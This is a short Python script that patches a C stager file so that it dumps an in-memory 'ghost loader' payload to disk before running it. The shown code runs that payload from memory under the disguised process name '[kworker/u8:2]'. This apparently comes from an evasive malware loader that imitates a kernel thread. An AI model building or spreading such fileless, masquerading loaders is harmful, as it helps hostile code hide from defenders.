import sys

with open('/app/stager/stager.c', 'r') as f:
    content = f.read()

target = """  printf("EXECUTING GHOST LOADER MEMORY, LEN: %zu\\n", ghost_len);
  rc = aegis_exec_from_memory(ghost_loader, ghost_len, "[kworker/u8:2]", NULL, NULL);"""

replacement = """  printf("EXECUTING GHOST LOADER MEMORY, LEN: %zu\\n", ghost_len);
  
  // Dump ghost loader to a file for debugging
  FILE *f = fopen("ghost_dump.bin", "wb");
  if (f) {
      fwrite(ghost_loader, 1, ghost_len, f);
      fclose(f);
      printf("DUMPED GHOST LOADER TO ghost_dump.bin\\n");
  } else {
      printf("FAILED TO DUMP GHOST LOADER\\n");
  }

  rc = aegis_exec_from_memory(ghost_loader, ghost_len, "[kworker/u8:2]", NULL, NULL);"""

if target in content:
    content = content.replace(target, replacement)
    with open('/app/stager/stager.c', 'w') as f:
        f.write(content)
    print("Stager exec patch applied!")
else:
    print("Stager exec target not found")

